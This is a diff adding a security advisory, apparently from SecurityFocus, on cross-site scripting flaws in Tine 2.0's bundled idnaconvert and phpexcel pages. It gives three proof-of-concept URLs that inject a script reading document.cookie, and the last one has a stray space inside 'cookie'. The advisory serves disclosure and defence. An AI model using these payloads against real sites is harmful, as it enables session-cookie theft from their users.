@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/50307/info
+
+Tine is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied data.
+
+An attacker could exploit these vulnerabilities to execute arbitrary script code in the context of the affected website. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Tine 2.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/library/idnaconvert/example.php?lang=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/library/idnaconvert/example.php/%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/library/phpexcel/phpexcel/shared/jama/docs/download.php/%27%3E%3Cscript%3Ealert%28document.cooki e%29;%3C/script%3E
